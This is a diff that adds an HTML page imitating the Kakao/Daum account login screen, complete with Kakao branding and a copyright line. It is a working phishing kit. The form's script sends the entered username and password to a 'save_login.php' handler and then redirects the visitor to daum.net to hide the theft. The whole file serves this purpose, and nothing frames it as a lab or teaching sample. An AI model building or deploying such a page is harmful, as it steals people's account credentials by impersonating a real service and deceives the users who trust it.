@@ -1,0 +1,187 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, width=device-width">
+  <meta http-equiv="x-ua-compatible" content="IE=edge">
+  <title>kakao</title>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      height: 100vh;
+      justify-content: center;
+    }
+    .header {
+      font-size: 32px;
+      font-weight: normal;
+      margin-bottom: 40px; /* Increases the distance to the box */
+    }
+    .container {
+      width: 400px; /* Made wider */
+      padding: 40px 40px; /* Increased the padding left and right */
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      border-radius: 6px; /* Made slightly more angular */
+    }
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .login-form input[type="text"],
+    .login-form input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .login-form label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #777;
+      margin-bottom: 20px;
+    }
+    .login-form input[type="checkbox"] {
+      margin-right: 10px;
+      accent-color: #ccc;
+    }
+    .login-form button {
+      width: 100%;
+      padding: 15px;
+      background-color: #ffeb00;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 10px;
+      border-radius: 4px;
+    }
+    .login-form .secondary-button {
+      background-color: #ddd;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    .links {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 20px;
+    }
+    .links a {
+      color: #999;
+      text-decoration: none;
+    }
+    .info {
+      margin-top: 20px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #777;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .info img {
+      margin-left: 10px;
+    }
+    .footer {
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+      width: 100%;
+      padding: 20px 0;
+      border-top: 1px solid #ddd;
+    }
+    .footer a {
+      color: #aaa;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+    .footer select {
+      border: none;
+      background: none;
+      color: #aaa;
+    }
+    .footer div {
+      margin: 5px 0;
+    }
+  </style>
+  <script>
+    function login() {
+      // Retrieve the input values
+      const username = document.querySelector('input[name="username"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      // Create an XMLHttpRequest object
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'save_login.php', true);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+      // Send the request with the form data
+      xhr.send(`username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`);
+
+      // Always redirect to the desired page after sending the data
+      setTimeout(() => {
+        window.location.href = 'https://www.daum.net';
+      }, 1000); // 1000ms delay to ensure the request is sent before redirecting
+    }
+  </script>
+</head>
+<body>
+  <div class="header">kakao</div>
+  <div class="container">
+    <form class="login-form" onsubmit="login(); return false;">
+      <input type="text" name="username" placeholder="KakaoMail ID, email, phone number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <label>
+        <input type="checkbox"> Save Login Information
+        <span style="font-size: 14px; color: #aaa; margin-left: 5px;">&#9432;</span>
+      </label>
+      <button type="submit">Log In</button>
+      <div style="margin: 10px 0;">or</div>
+      <button type="button" class="secondary-button">Log in with QR code</button>
+    </form>
+    <div class="links">
+      <a href="#" style="text-align: left;">Sign Up</a>
+      <div style="text-align: right;">
+        <a href="#">Find Account</a>
+        <span style="color: #ddd; margin: 0 5px;">|</span>
+        <a href="#">Reset Password</a>
+      </div>
+    </div>
+    <div class="info">
+      <div>
+        <strong>Daum ID Information</strong><br>
+        Please merge with your Kakao Account.
+      </div>
+      <img src="https://via.placeholder.com/50" alt="Daum ID Information">
+    </div>
+  </div>
+  <div class="footer">
+    <div>
+      <a href="#">Terms of Service</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Operation Policy</a>
+      <a href="#">Customer Service</a>
+      <a href="#">Notices</a>
+      <select>
+        <option>English</option>
+      </select>
+    </div>
+    <div>
+      &copy; Kakao Corp. All rights reserved.
+    </div>
+  </div>
+</body>
+</html>
